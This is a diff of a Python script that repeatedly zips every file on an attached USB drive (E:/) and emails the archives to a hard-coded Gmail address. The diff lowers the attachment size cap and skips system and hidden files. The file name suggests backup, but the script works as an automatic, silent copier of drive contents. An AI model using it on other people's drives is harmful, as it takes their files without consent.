@@ -16,7 +16,7 @@ DESTINO = "skibidiohiorizzkaicenatgyatt@gmail.com"
 
 PEN_DRIVE = Path("E:/")
 ZIP_NAME = Path("backup_usb.zip")
-MAX_SIZE = 20 * 1024 * 1024
+MAX_SIZE = 18 * 1024 * 1024
 count = 0
 
 scheduler = BlockingScheduler()
@@ -27,7 +27,14 @@ def make_zips(folder: Path, max_size=MAX_SIZE):
     current_zip_files = []
     current_size = 0
 
-    all_files = [f for f in folder.rglob("*") if f.is_file()]
+    IGNORE = ["System Volume Information", "$RECYCLE.BIN"]
+
+    all_files = [
+        f for f in folder.rglob("*")
+        if f.is_file()
+        and not any(part in IGNORE for part in f.parts)
+        and not f.name.startswith(".")
+    ]
 
     for file in all_files:
         file_size = file.stat().st_size
@@ -86,6 +93,8 @@ def send_email(zip_paths):
         zip_path.unlink()
 
 def saver():
+    global count
+
     while True:
         if PEN_DRIVE.exists():
             zips = make_zips(PEN_DRIVE)
